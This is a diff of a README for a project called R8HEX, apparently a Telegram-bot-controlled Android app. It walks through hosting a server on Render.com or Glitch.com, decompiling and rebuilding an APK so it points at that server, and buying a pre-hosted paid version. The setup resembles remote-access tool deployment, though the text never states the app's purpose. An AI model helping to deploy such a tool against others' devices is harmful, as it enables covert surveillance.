@@ -1,70 +1,76 @@
-# Free version deployment
+# 🚀 Free & Paid Version Deployment Guide
 
-# Download All Files From Here 👇👇
+## 📂 Download Free Version Files
+👉 [𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗙𝗥𝗘𝗘 𝗙𝗜𝗟𝗘𝗦](https://github.com/Tocsiop/R8HEX/archive/refs/tags/1.0.0.zip)
 
-<a href="https://github.com/Tocsiop/R8HEX/archive/refs/tags/V1.2.0-R8HEX.zip">𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗙𝗥𝗘𝗘 𝗙𝗜𝗟𝗘𝗦</a>
+---
 
-
-
-## 𝐇𝐨𝐰 𝐭𝐨 𝐡𝐨𝐬𝐭 𝐬𝐞𝐫𝐯𝐞𝐫 𝐢𝐧 𝐑𝐄𝐍𝐃𝐄𝐑.𝐂𝐎𝐌
-<p>FOLLOW THWSW STEPS:</p>
-
-
-
-```bash  
- - DOWNLOAD THE FILES FROM HERE
- - CREATE A GITHUB ACCOUNT 
- - CREATE A PRIVATE NEW REPO AND UPLOAD ALL FILES {SERVER.JS/PACKAGE.JSON/DATA.JSON }
- - NOW GO TO RENDER.COM
+## 🌐 How to Host Server on Render.com
+```bash
+- DOWNLOAD THE FILES FROM HERE
+- CREATE A GITHUB ACCOUNT 
+- CREATE A PRIVATE NEW REPO AND UPLOAD ALL FILES {SERVER.JS/PACKAGE.JSON/DATA.JSON }
+- NOW GO TO RENDER.COM
   SIGNUP WITH GITHUB/CONFIRM ACCOUNT/CONNECT GITHUB ACCOUNT
- - NOW CLICK ON NEW WEB SERVICE/SELECT FREE  TRIAL/GIVE ANY RANDOM NAME OF YOUR WEB SERVICE
-- NOW YOU WILL SEE HERE YOUR REPO WHICH YOU CREATED 
-- CLCIK ON THAT IT WILL START DEPLOYING IGNORE IT AND COPY THE URL OF YOUR WEB SERVICE
-- NOW COME TO YOUR GITHUB REPO AND EDIT DATA.JSON
-- ENTER YOUR BOT TOKEN, AND CHAT ID URL WHICH YOU COPIED FROM RENDER.COM
-- SAVE DATA.JSON
-- GO BACK TO RENDER.COM OPEN YOUR PROJECT AND CLICK ON DEPLOY/THEN DEPLOY THE LATEST COMMITS
-- IT WILL TAKE A FEW SECONDS ONCE YOU SEE IN THE TERMINAL THAT YOUR SERVICE IS LIVE
-- NOW GO TO THE TELEGRAM BOT AND START THE BOT ENJOY
+- CLICK ON NEW WEB SERVICE/SELECT FREE TRIAL/GIVE ANY RANDOM NAME OF YOUR WEB SERVICE
+- SELECT YOUR GITHUB REPO → IT WILL START DEPLOYING (IGNORE FIRST DEPLOY)
+- COPY YOUR RENDER URL
+- EDIT DATA.JSON IN YOUR GITHUB REPO → ENTER BOT TOKEN & CHAT ID
+- SAVE DATA.JSON → GO BACK TO RENDER.COM → DEPLOY LATEST COMMIT
+- WAIT FEW SECONDS → ONCE LIVE → START BOT IN TELEGRAM ✅
 ```
 
-## 𝐄𝐝𝐢𝐭 𝐚𝐩𝐩
- - Open Apk editor 
- - select app
- - choose full edit
- - select decode all files
- - go to the assets folder
- - open host.json
- - and enter URL
- - build app,start the bot  Enjoy
+---
 
-## example
-```bash  
-  https://yourRENDERURL.com/
-
+## 📱 Edit App (Client Side)
+```bash
+- Open APK Editor
+- Select App → Full Edit → Decode all files
+- Go to assets/host.json
+- Enter your hosted URL
+- Build App → Install → Start the bot ✅
 ```
 
-## 𝐇𝐨𝐰 𝐭𝐨 𝐡𝐨𝐬𝐭 𝐬𝐞𝐫𝐯𝐞𝐫 𝐢𝐧 𝐆𝐋𝐈𝐓𝐂𝐇.𝐂𝐎𝐌
+👉 Example URL:
+```bash
+https://yourRENDERURL.com/
+```
 
-- 𝐂𝐑𝐄𝐀𝐓𝐄 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐎𝐍 GLITCH.COM
-- 𝐂𝐄𝐀𝐓𝐄 𝐀 𝐍𝐎𝐃𝐄.𝐉𝐒 𝐁𝐋𝐀𝐍𝐊 𝐏𝐑𝐎𝐉𝐄𝐂𝐓
-- 𝐔𝐏𝐋𝐎𝐀𝐃 𝐒𝐄𝐑𝐕𝐄𝐑.𝐉𝐒,𝐃𝐀𝐓𝐀.𝐉𝐒𝐎𝐍 𝐀𝐍𝐃 𝐏𝐀𝐂𝐊𝐀𝐆𝐄.𝐉𝐒𝐎𝐍 𝐓𝐎 𝐏𝐑𝐎𝐉𝐄𝐂𝐓
-- 𝐄𝐃𝐈𝐓 𝐃𝐀𝐓𝐀.𝐉𝐒𝐎𝐍 𝐖𝐈𝐓𝐇 𝐘𝐎𝐔𝐑 𝐁𝐎𝐓 𝐓𝐎𝐊𝐄𝐍 𝐀𝐍𝐃 𝐂𝐇𝐀𝐓 𝐈𝐃
-- 𝐂𝐋𝐈𝐂𝐊 𝐓𝐎 𝐕𝐈𝐄𝐖 𝐍𝐄𝐖 𝐖𝐈𝐍𝐃𝐎𝐖 𝐀𝐍𝐃 𝐂𝐎𝐏𝐘 𝐓𝐇𝐄 𝐋𝐈𝐍𝐊 𝐀𝐍𝐃 𝐏𝐀𝐒𝐓𝐄 𝐈𝐓 𝐈𝐍 𝐂𝐋𝐈𝐍𝐓.𝐀𝐏𝐊
+---
 
-## Watch this Video For Batter Understanding 👇👇👇
+## 🌐 How to Host on Glitch.com
+```bash
+- CREATE ACCOUNT ON GLITCH.COM
+- CREATE NEW NODE.JS PROJECT (Blank)
+- UPLOAD SERVER.JS, DATA.JSON, PACKAGE.JSON
+- EDIT DATA.JSON WITH BOT TOKEN & CHAT ID
+- CLICK "VIEW IN NEW WINDOW"
+- COPY LINK → ADD TO APK (host.json)
+```
 
-<a href="https://t.me/R8HEX/6">
-    <img src="https://img.shields.io/badge/BUY-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
-  </a>
+---
 
-# Download All Files From Here 👇👇
+## ▶️ Video Tutorial
+👉 [Watch Deployment Video](https://t.me/R8HEX/6)
 
-<a href="https://github.com/Tocsiop/R8HEX/archive/refs/tags/V1.2.0-R8HEX.zip">𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗙𝗥𝗘𝗘 𝗙𝗜𝗟𝗘𝗦</a>
+---
 
+# 🔥 Why Upgrade to Paid Version?
 
-<h2 align="center">🔗 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐚𝐧𝐝 𝐒𝐨𝐜𝐢𝐚𝐥 𝐌𝐞𝐝𝐢𝐚 𝐀𝐜𝐜𝐨𝐮𝐧𝐭𝐬</h2>
+👉 Free version me aapko khud hosting karni hoti hai, config edit karna padta hai, aur kabhi server down bhi ho sakta hai.
 
+⚡ **Paid Version Benefits:**
+- Pre-Hosted Server (no setup required)
+- Ready-to-use APK (no editing needed)
+- Faster, Secure & Auto Managed
+- 24/7 Uptime Guarantee
+- Premium Support
+
+🎯 Matlab Paid Version me aapko kuch bhi karna nahi hai → bas install & start using!
+
+---
+
+# 📢 Contact & Social Media
 <p align="center">
   <a href="https://t.me/R8HEX">
     <img src="https://img.shields.io/badge/CONTACT-TELEGRAM-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
@@ -73,4 +79,3 @@
     <img src="https://img.shields.io/badge/CONTACT-YOUTUBE-red?style=for-the-badge&logo=youtube" alt="Youtube Badge"/>
   </a>
 </p>
-
